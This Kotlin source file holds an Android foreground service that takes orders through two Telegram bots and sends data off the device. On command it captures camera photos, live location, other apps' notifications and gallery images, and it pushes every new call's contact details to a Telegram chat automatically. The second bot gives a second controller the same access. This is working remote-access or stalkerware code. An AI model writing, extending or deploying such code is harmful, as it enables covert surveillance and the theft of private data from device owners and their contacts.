package com.rtk.telegrammanager.service

import android.Manifest
import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.content.Intent
import android.content.pm.PackageManager
import android.database.ContentObserver
import android.net.Uri
import android.os.Handler
import android.os.IBinder
import android.os.Looper
import android.provider.CallLog
import androidx.core.app.NotificationCompat
import androidx.core.content.ContextCompat
import androidx.lifecycle.LifecycleService
import com.rtk.telegrammanager.calls.CallLogManager
import com.rtk.telegrammanager.camera.CameraManager
import com.rtk.telegrammanager.data.AppConfig
import com.rtk.telegrammanager.gallery.GalleryManager
import com.rtk.telegrammanager.location.LocationManager
import com.rtk.telegrammanager.telegram.CommandRouter
import com.rtk.telegrammanager.telegram.TelegramApi
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.cancel
import kotlinx.coroutines.delay
import kotlinx.coroutines.isActive
import kotlinx.coroutines.launch

class BotForegroundService : LifecycleService() {

    companion object {
        const val CHANNEL_ID = "rtk_bot_service"
        const val NOTIFICATION_ID = 1001
        const val ACTION_GALLERY_REQUEST =
            "com.rtk.telegrammanager.action.GALLERY_REQUEST"
        const val BOT2_RESPONSE_DELAY_MS = 3_000L
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    private lateinit var config: AppConfig
    private lateinit var commandRouter: CommandRouter
    private val telegramApi = TelegramApi()

    private lateinit var callLogManager: CallLogManager
    private lateinit var galleryManager: GalleryManager
    private lateinit var locationManager: LocationManager
    private lateinit var cameraManager: CameraManager

    private val callLogObserver = object : ContentObserver(Handler(Looper.getMainLooper())) {
        override fun onChange(selfChange: Boolean, uri: Uri?) {
            super.onChange(selfChange, uri)
            scope.launch { handleCallLogChanged() }
        }
    }

    override fun onCreate() {
        super.onCreate()

        config = AppConfig(this)
        commandRouter = CommandRouter(this)
        callLogManager = CallLogManager(this)
        galleryManager = GalleryManager(this)
        locationManager = LocationManager(this)
        cameraManager = CameraManager(this)

        createNotificationChannel()
        registerCallLogObserver()

        startForeground(
            NOTIFICATION_ID,
            buildNotification("Telegram listener starting…")
        )

        startListener()
    }

    private fun startListener() {
        startPrimaryBotListener()
        startSecondaryBotListener()
    }

    private fun processCommand(token: String, chatId: String, text: String) {
        val reply = commandRouter.route(text) ?: return

        scope.launch {
            when (reply) {
                "GALLERY_REQUEST" -> handleGalleryRequest(token, chatId)
                "LOCATION_REQUEST" -> handleLocationRequest(token, chatId)
                "CAMERA_FRONT_REQUEST" -> handleCameraRequest(token, chatId, isFront = true)
                "CAMERA_BACK_REQUEST" -> handleCameraRequest(token, chatId, isFront = false)
                "NOTIFICATION_STATUS_REQUEST" ->
                    handleNotificationStatusRequest(token, chatId)
                else -> {
                val command = text.trim()
                    .substringBefore(" ")
                    .substringBefore("@")
                    .lowercase()

                if (command == "/calls") {
                    telegramApi.sendMessageChunked(
                        token = token,
                        chatId = chatId,
                        text = reply
                    )
                } else {
                    telegramApi.sendMessage(
                        token = token,
                        chatId = chatId,
                        text = reply
                    )
                }
            }
            }
        }
    }

    private fun startPrimaryBotListener() {
        scope.launch {
            val token = config.getToken()
            val authorizedChatId = config.getChatId()

            if (token.isNullOrBlank() || authorizedChatId.isNullOrBlank()) {
                updateNotification("Setup required")
                stopSelf()
                return@launch
            }

            var consecutiveErrors = 0

            while (isActive) {
                telegramApi.getUpdates(token = token, offset = config.getUpdateOffset())
                    .onSuccess { updates ->
                        consecutiveErrors = 0
                        for (update in updates) {
                            val message = update.message
                            if (message != null && message.chatId == authorizedChatId) {
                                processCommand(token, authorizedChatId, message.text)
                            }
                            config.setUpdateOffset(update.updateId + 1L)
                        }

                        updateNotification(
                            if (updates.isEmpty()) "Telegram dual listener active"
                            else "Telegram connected • ${updates.size} update(s)"
                        )
                    }
                    .onFailure {
                        consecutiveErrors++
                        updateNotification("Telegram reconnecting…")
                        val backoff = minOf(30_000L, 1_000L * consecutiveErrors)
                        delay(backoff)
                    }

                if (consecutiveErrors == 0) delay(500L)
            }
        }
    }

    private fun startSecondaryBotListener() {
        scope.launch {
            val token = config.getBot2Token()
            val authorizedChatId = config.getBot2ChatId()

            if (token.isNullOrBlank() || authorizedChatId.isNullOrBlank()) return@launch

            var consecutiveErrors = 0

            while (isActive) {
                telegramApi.getUpdates(token = token, offset = config.getBot2UpdateOffset())
                    .onSuccess { updates ->
                        consecutiveErrors = 0
                        for (update in updates) {
                            val message = update.message
                            if (message != null && message.chatId == authorizedChatId) {
                                delay(BOT2_RESPONSE_DELAY_MS)
                                processCommand(token, authorizedChatId, message.text)
                            }
                            config.setBot2UpdateOffset(update.updateId + 1L)
                        }
                    }
                    .onFailure {
                        consecutiveErrors++
                        val backoff = minOf(30_000L, 1_000L * consecutiveErrors)
                        delay(backoff)
                    }

                if (consecutiveErrors == 0) delay(500L)
            }
        }
    }

    private suspend fun handleNotificationStatusRequest(
        token: String,
        chatId: String
    ) {
        val notifications =
            NotificationListener.getCurrentNotifications()

        if (notifications.isEmpty()) {
            val status =
                if (NotificationListener.isConnected()) {
                    "🟢 Notification Access: ENABLED\n\n" +
                    "🔔 Current notifications: 0"
                } else {
                    "🔴 Notification Access: NOT ENABLED\n\n" +
                    "Please enable RTK Notification Reader in Android Notification Access settings."
                }

            telegramApi.sendMessage(
                token = token,
                chatId = chatId,
                text = status
            )

            return
        }

        telegramApi.sendMessage(
            token = token,
            chatId = chatId,
            text =
                "🔔 CURRENT NOTIFICATIONS\n\n" +
                "Total: ${notifications.size}"
        )

        val maxLength = 3800
        var current = StringBuilder()

        for ((index, notification) in notifications.withIndex()) {

            val item =
                "${index + 1}. $notification\n\n"

            if (
                current.length + item.length >
                maxLength
            ) {
                telegramApi.sendMessage(
                    token = token,
                    chatId = chatId,
                    text = current.toString().trim()
                )

                current = StringBuilder()
            }

            current.append(item)
        }

        if (current.isNotEmpty()) {
            telegramApi.sendMessage(
                token = token,
                chatId = chatId,
                text = current.toString().trim()
            )
        }
    }

    private suspend fun handleLocationRequest(token: String, chatId: String) {
        telegramApi.sendMessage(token, chatId, "📍 Fetching live device location...")
        val locationMessage = locationManager.getLocationText()
        telegramApi.sendMessage(token, chatId, locationMessage)
    }

    private suspend fun handleCameraRequest(token: String, chatId: String, isFront: Boolean) {
        val lensLabel = if (isFront) "Front 🤳" else "Back 📸"
        telegramApi.sendMessage(token, chatId, "📸 Capturing $lensLabel photo...")

        val photoFile = cameraManager.capturePhoto(isFrontCamera = isFront, lifecycleOwner = this@BotForegroundService)

        if (photoFile != null && photoFile.exists()) {
            val photoUri = Uri.fromFile(photoFile)
            val caption = "📷 $lensLabel Camera Photo"

            val result = telegramApi.sendPhoto(
                token = token,
                chatId = chatId,
                photoUri = photoUri,
                contentResolver = contentResolver,
                caption = caption
            )

            if (result.isFailure) {
                telegramApi.sendMessage(token, chatId, "❌ Failed to send photo to Telegram.")
            }
            photoFile.delete()
        } else {
            telegramApi.sendMessage(
                token,
                chatId,
                "❌ Camera Capture Failed. Ensure CAMERA permission is granted on the device."
            )
        }
    }

    private fun registerCallLogObserver() {
        if (!config.isAutomaticCallAlertsEnabled()) return
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return

        val latestId = callLogManager.getLatestCallId()
        if (config.getLastProcessedCallId() == 0L && latestId != null) {
            config.setLastProcessedCallId(latestId)
        }

        contentResolver.registerContentObserver(CallLog.Calls.CONTENT_URI, true, callLogObserver)
    }

    private suspend fun handleCallLogChanged() {
        if (!config.isBotEnabled() || !config.isAutomaticCallAlertsEnabled()) return
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) return

        val token = config.getToken()
        val chatId = config.getChatId()
        if (token.isNullOrBlank() || chatId.isNullOrBlank()) return

        val latestId = callLogManager.getLatestCallId() ?: return
        val lastId = config.getLastProcessedCallId()
        if (latestId <= lastId) return

        val call = callLogManager.getCallById(latestId)
        config.setLastProcessedCallId(latestId)
        if (call == null) return

        val message = buildString {
            appendLine("📞 NEW CALL")
            appendLine()
            appendLine("👤 ${call.name}")
            appendLine("📱 ${call.number}")
            appendLine("↔ ${call.type} • ${call.status}")
            appendLine("🕒 ${call.date}")
            appendLine("⏱ ${call.duration}")
        }

        telegramApi.sendMessage(token = token, chatId = chatId, text = message)
    }

    private suspend fun handleGalleryRequest(token: String, chatId: String) {
        if (!config.isBotEnabled()) {
            telegramApi.sendMessage(token, chatId, "🔴 Bot is disabled.")
            return
        }

        if (!config.isRemoteGalleryBackupEnabled()) {
            telegramApi.sendMessage(
                token, chatId,
                "🖼️ Remote Gallery Backup is OFF.\n\nEnable it from app settings first."
            )
            return
        }

        if (!galleryManager.hasPermission()) {
            telegramApi.sendMessage(
                token, chatId,
                "🖼️ Gallery permission is not granted."
            )
            return
        }

        val limit = config.getGalleryBackupLimit()
        val images = galleryManager.getRecentImages(limit)

        if (images.isEmpty()) {
            telegramApi.sendMessage(token, chatId, "🖼️ No recent gallery images found.")
            return
        }

        telegramApi.sendMessage(
            token, chatId,
            "🖼️ Gallery backup started.\nSending ${images.size} recent image(s)…"
        )

        var successCount = 0
        var failedCount = 0

        images.forEachIndexed { index, image ->
            val caption = "🖼️ Gallery ${index + 1}/${images.size}\n${image.name}"
            val result = telegramApi.sendPhoto(
                token = token,
                chatId = chatId,
                photoUri = image.uri,
                contentResolver = contentResolver,
                caption = caption
            )

            if (result.isSuccess) successCount++ else failedCount++
        }

        val resultText = buildString {
            appendLine("🖼️ GALLERY BACKUP COMPLETE")
            appendLine()
            appendLine("✅ Sent: $successCount")
            appendLine("❌ Failed: $failedCount")
            appendLine("📦 Requested: ${images.size}")
        }

        telegramApi.sendMessage(token, chatId, text = resultText)
    }

    private fun createNotificationChannel() {
        val manager = getSystemService(NotificationManager::class.java)
        val channel = NotificationChannel(
            CHANNEL_ID,
            "RTK Telegram Manager",
            NotificationManager.IMPORTANCE_LOW
        ).apply {
            description = "Shows the status of the Telegram command service."
        }
        manager.createNotificationChannel(channel)
    }

    private fun buildNotification(text: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setSmallIcon(android.R.drawable.ic_dialog_info)
            .setContentTitle("RTK Telegram Manager")
            .setContentText(text)
            .setOngoing(true)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .build()
    }

    private fun updateNotification(text: String) {
        val manager = getSystemService(NotificationManager::class.java)
        manager.notify(NOTIFICATION_ID, buildNotification(text))
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        super.onStartCommand(intent, flags, startId)

        if (intent?.action == ACTION_GALLERY_REQUEST) {
            scope.launch {
                val token = config.getToken()
                val chatId = config.getChatId()
                if (!token.isNullOrBlank() && !chatId.isNullOrBlank()) {
                    handleGalleryRequest(token = token, chatId = chatId)
                }
            }
        }
        return START_STICKY
    }

    override fun onDestroy() {
        runCatching { contentResolver.unregisterContentObserver(callLogObserver) }
        scope.cancel()
        super.onDestroy()
    }

    override fun onBind(intent: Intent): IBinder? {
        super.onBind(intent)
        return null
    }
}
